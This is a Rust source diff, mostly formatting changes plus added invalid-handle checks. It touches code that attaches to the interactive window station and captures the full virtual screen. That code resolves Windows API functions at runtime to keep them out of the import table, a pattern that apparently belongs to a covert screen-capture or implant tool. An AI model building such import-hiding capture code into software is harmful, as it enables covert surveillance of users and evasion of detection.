@@ -309,19 +309,17 @@ unsafe fn attach_interactive() -> bool {
 unsafe fn detach_interactive() {
     use core::ffi::c_void;
     type CloseWindowStation = unsafe extern "system" fn(*mut c_void) -> i32;
-    let cws: CloseWindowStation = match unsafe {
-        crate::resolve::export_addr(b"user32.dll", b"CloseWindowStation")
-    } {
-        Some(a) => unsafe { core::mem::transmute(a) },
-        None => return,
-    };
+    let cws: CloseWindowStation =
+        match unsafe { crate::resolve::export_addr(b"user32.dll", b"CloseWindowStation") } {
+            Some(a) => unsafe { core::mem::transmute(a) },
+            None => return,
+        };
     type SetProcessWindowStation = unsafe extern "system" fn(*mut c_void) -> i32;
-    let spws: SetProcessWindowStation = match unsafe {
-        crate::resolve::export_addr(b"user32.dll", b"SetProcessWindowStation")
-    } {
-        Some(a) => unsafe { core::mem::transmute(a) },
-        None => return,
-    };
+    let spws: SetProcessWindowStation =
+        match unsafe { crate::resolve::export_addr(b"user32.dll", b"SetProcessWindowStation") } {
+            Some(a) => unsafe { core::mem::transmute(a) },
+            None => return,
+        };
 
     // Restore the original window station BEFORE closing our WinSta0 handle.
     // Closing the active station is undefined behaviour (per MSDN).
@@ -368,7 +366,8 @@ fn capture_bmp() -> Option<(Vec<u8>, bool)> {
         type GetDc = unsafe extern "system" fn(*mut c_void) -> *mut c_void;
         type ReleaseDc = unsafe extern "system" fn(*mut c_void, *mut c_void) -> i32;
         type CreateCompatibleDc = unsafe extern "system" fn(*mut c_void) -> *mut c_void;
-        type CreateCompatibleBitmap = unsafe extern "system" fn(*mut c_void, i32, i32) -> *mut c_void;
+        type CreateCompatibleBitmap =
+            unsafe extern "system" fn(*mut c_void, i32, i32) -> *mut c_void;
         type SelectObject = unsafe extern "system" fn(*mut c_void, *mut c_void) -> *mut c_void;
         type BitBlt = unsafe extern "system" fn(
             *mut c_void,
@@ -396,7 +395,8 @@ fn capture_bmp() -> Option<(Vec<u8>, bool)> {
         let gsm: GetSystemMetrics =
             unsafe { core::mem::transmute(export_addr(b"user32.dll", b"GetSystemMetrics")?) };
         let gdc: GetDc = unsafe { core::mem::transmute(export_addr(b"user32.dll", b"GetDC")?) };
-        let rdc: ReleaseDc = unsafe { core::mem::transmute(export_addr(b"user32.dll", b"ReleaseDC")?) };
+        let rdc: ReleaseDc =
+            unsafe { core::mem::transmute(export_addr(b"user32.dll", b"ReleaseDC")?) };
         let ccdc: CreateCompatibleDc =
             unsafe { core::mem::transmute(export_addr(b"gdi32.dll", b"CreateCompatibleDC")?) };
         let ccb: CreateCompatibleBitmap =
@@ -404,10 +404,12 @@ fn capture_bmp() -> Option<(Vec<u8>, bool)> {
         let so: SelectObject =
             unsafe { core::mem::transmute(export_addr(b"gdi32.dll", b"SelectObject")?) };
         let bb: BitBlt = unsafe { core::mem::transmute(export_addr(b"gdi32.dll", b"BitBlt")?) };
-        let gdb: GetDiBits = unsafe { core::mem::transmute(export_addr(b"gdi32.dll", b"GetDIBits")?) };
+        let gdb: GetDiBits =
+            unsafe { core::mem::transmute(export_addr(b"gdi32.dll", b"GetDIBits")?) };
         let do_: DeleteObject =
             unsafe { core::mem::transmute(export_addr(b"gdi32.dll", b"DeleteObject")?) };
-        let ddc: DeleteDc = unsafe { core::mem::transmute(export_addr(b"gdi32.dll", b"DeleteDC")?) };
+        let ddc: DeleteDc =
+            unsafe { core::mem::transmute(export_addr(b"gdi32.dll", b"DeleteDC")?) };
 
         let vsx = unsafe { gsm(SM_XVIRTUALSCREEN) };
         let vsy = unsafe { gsm(SM_YVIRTUALSCREEN) };
@@ -438,7 +440,18 @@ fn capture_bmp() -> Option<(Vec<u8>, bool)> {
                 return None;
             }
             let prev = so(mdc, bmp);
-            if bb(mdc, 0, 0, w as i32, h as i32, sdc, vsx, vsy, SRCCOPY | CAPTUREBLT) == 0 {
+            if bb(
+                mdc,
+                0,
+                0,
+                w as i32,
+                h as i32,
+                sdc,
+                vsx,
+                vsy,
+                SRCCOPY | CAPTUREBLT,
+            ) == 0
+            {
                 so(mdc, prev);
                 do_(bmp);
                 ddc(mdc);
@@ -551,7 +564,7 @@ unsafe fn write_all_to_file(path: &[u8], data: &[u8]) -> bool {
             core::ptr::null_mut(),
         )
     };
-    if h.is_null() {
+    if h.is_null() || h as usize == !0 {
         return false;
     }
     let mut off = 0usize;
@@ -1064,7 +1077,7 @@ unsafe fn read_file(path: &[u8]) -> Option<Vec<u8>> {
             core::ptr::null_mut(),
         )
     };
-    if h.is_null() {
+    if h.is_null() || h as usize == !0 {
         return None;
     }
     let mut out: Vec<u8> = Vec::new();
